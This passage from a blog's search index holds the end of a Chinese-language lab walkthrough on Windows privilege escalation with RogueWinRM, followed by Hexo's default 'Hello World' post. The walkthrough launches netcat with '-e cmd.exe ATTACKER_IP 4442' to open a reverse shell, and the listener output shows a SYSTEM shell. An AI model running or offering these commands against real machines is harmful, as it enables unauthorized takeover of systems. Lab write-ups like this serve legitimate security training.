class="code"><pre><span class="line">然后，使用我们的 Web shell 使用以下命令触发 RogueWinRM 漏洞：</span><br><span class="line"></span><br><span class="line">c:\tools\RogueWinRM\RogueWinRM.exe -p &quot;C:\tools\nc64.exe&quot; -a &quot;-e cmd.exe ATTACKER_IP 4442&quot;</span><br></pre></td></tr></table></figure><p><img src="/tu/24545e313a2e5ddee2386a68b4c7adeb.png" alt="RogueWinRM exploit execution"></p><p>**注意：**该漏洞可能需要长达 2 分钟才能起作用，因此您的浏览器可能会在一段时间内显示为无响应。如果您多次运行漏洞利用，则会发生这种情况，因为它必须等待 BITS 服务停止后才能再次启动它。BITS 服务将在启动 2 分钟后自动停止。</p><p><code>-p</code> 参数指定漏洞利用程序要运行的可执行文件，在本例中<code>为 nc64.exe</code>。<code>-a</code> 参数用于将参数传递给可执行文件。由于我们希望 nc64 建立一个针对攻击者机器的反向 shell，因此传递给 netcat 的参数将是 <code>-e cmd.exe ATTACKER_IP 4442</code>。</p><p>如果所有设置都已正确，您应该会得到一个具有 SYSTEM 权限的 shell：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@attackerpc$ nc -lvp 4442</span><br><span class="line">Listening on 0.0.0.0 4442</span><br><span class="line">Connection received on 10.10.175.90 49755</span><br><span class="line">Microsoft Windows [Version 10.0.17763.1821]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">c:\windows\system32\inetsrv&gt;whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/03/02/hello-world/"/>
      <url>/2025/03/02/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
